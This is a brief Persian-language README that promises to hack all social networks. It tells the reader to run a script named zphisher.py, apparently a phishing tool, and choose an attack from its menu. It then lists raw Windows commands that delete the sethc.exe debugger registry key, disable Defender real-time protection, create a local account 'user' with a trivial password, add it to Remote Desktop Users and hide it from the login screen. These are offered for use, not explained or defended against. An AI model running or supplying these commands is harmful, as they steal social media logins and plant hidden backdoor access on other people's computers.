# hock
هک همه شبکه های اجتماعی

# نصب

بعد اینه که دانلود کردین وارد پوشه  شده و درستورات زیر را وارد کنید

## دستورات
$python zphisher.py
## تمام ##
وارد منو شوید هر هکی دوس دارید انجام بدید
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"



start Powershell Set-MpPreference -DisableRealtimeMonitoring $true



net user user pass /add
net localgroup "Remote Desktop Users" user /add

reg add "hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist" /v user /t reg_dword /d 0 /f
